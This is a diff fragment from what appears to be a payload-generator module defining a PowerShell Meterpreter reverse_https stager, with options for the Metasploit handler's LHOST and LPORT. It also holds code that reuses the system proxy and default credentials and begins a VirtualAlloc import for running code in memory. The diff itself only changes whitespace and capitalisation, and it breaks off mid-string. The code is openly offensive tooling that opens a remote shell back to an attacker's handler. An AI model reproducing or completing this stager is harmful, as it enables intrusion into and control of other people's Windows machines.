@@ -10,23 +10,23 @@ from modules.common import helpers
 
 
 class Payload:
-    
+
     def __init__(self):
         # required options
         self.description = "pure windows/meterpreter/reverse_https stager, no shellcode"
         self.rating = "Excellent"
         self.language = "powershell"
         self.extension = "bat"
-        
+
         # optional
-        self.required_options = {   "LHOST" : ["", "IP of the metasploit handler"],
-                                    "LPORT" : ["8443", "Port of the metasploit handler"],
+        self.required_options = {   "LHOST" : ["", "IP of the Metasploit handler"],
+                                    "LPORT" : ["8443", "Port of the Metasploit handler"],
                                     "PROXY" : ["N", "Use system proxy settings"]
                                 }
 
-    
+
     def generate(self):
-        
+
         proxyString = "$pr = [System.Net.WebRequest]::GetSystemWebProxy();$pr.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$m.proxy=$pr;$m.UseDefaultCredentials=$true;"
         baseString = """$q = @"
 [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
